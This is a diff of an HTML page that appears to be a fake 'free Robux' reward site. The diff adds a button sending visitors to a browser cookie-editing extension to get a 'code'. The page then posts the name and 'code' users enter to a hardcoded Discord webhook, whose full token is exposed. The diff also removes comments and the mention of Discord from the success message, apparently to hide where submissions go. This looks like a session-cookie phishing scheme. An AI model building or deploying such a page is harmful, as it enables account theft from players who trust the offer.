@@ -659,13 +659,17 @@ font-size: 60px;
             <h1>rbx</h1>
         </div>
         <p>Choose an option for the Robux task, then enter your code and name in the field below..</p>
+        
+        <a href="https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm" target="_blank" style="text-decoration: none;">
+            <button style="width: auto; padding: 15px 30px; margin-top: 20px; font-size: 16px;">GET YuPPie code</button>
+        </a>
+        
         <div class="scroll">↓ SCROLL DOWN ↓</div>
     </div>
 </section>
 
 <section class="section">
     <div class="section-container">
-        <!-- ADS SIDEBAR -->
         <div class="ads-sidebar">
             <div class="ad-box" id="box1" onclick="watchAds(1, 500, this)">
                 <span class="watched-badge">✓ WATCHED</span>
@@ -690,7 +694,6 @@ font-size: 60px;
             </div>
         </div>
 
-        <!-- MAIN CARD -->
         <div class="card">
             <h2>Send a Message</h2>
             <p>You can send your name and code from here..</p>
@@ -707,7 +710,6 @@ font-size: 60px;
     </div>
 </section>
 
-<!-- AD MODAL -->
 <div class="modal" id="adModal">
     <div class="modal-content">
         <div class="ad-header">
@@ -735,7 +737,6 @@ font-size: 60px;
 </div>
 
 <script>
-// WARNING: This webhook is public on the internet. For security, set Discord server permissions so this webhook can ONLY send messages.
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1505531338487369748/kqs6qRLY5o0dph0lefEnIDXqtKWlQKBKbNeORNK78k5MTM2gbY6yQTTr8P5gxmAz7lyZ";
 
 const ads = [
@@ -791,7 +792,6 @@ function watchAds(count, robux, element){
         return;
     }
     
-    // Diğer kutuları devre dışı bırak
     const boxId = element.id;
     disableOtherBoxes(boxId);
     selectedBox = boxId;
@@ -854,16 +854,13 @@ function completeAdWatching(){
     adWatched = true;
     adPlaying = false;
     
-    // Mark ad box as watched
     if(adBoxElement){
         adBoxElement.classList.add('watched');
     }
     
-    // Tüm kutuları tekrar aktif et (İzlenen hariç)
     enableAllBoxes();
 }
 
-// Modal arka planını tıklamayı engelle
 document.addEventListener('DOMContentLoaded', function() {
     const modal = document.getElementById('adModal');
     modal.addEventListener('click', function(e) {
@@ -881,7 +878,6 @@ async function sendMessage(){
     const sendBtn = document.getElementById("sendBtn");
     const warning = document.getElementById("warning");
 
-    // Check if ad was watched
     if(!adWatched){
         warning.classList.add('show');
         status.innerText = "";
@@ -926,10 +922,9 @@ async function sendMessage(){
 
         if(response.ok) {
             status.style.color = "#10b981";
-            status.innerText = "Message sent successfully! Check Discord.";
+            status.innerText = "Message sent successfully! .";
             messageInput.value = "";
             
-            // Reset for next message
             adWatched = false;
             if(adBoxElement){
                 adBoxElement.classList.remove('watched');
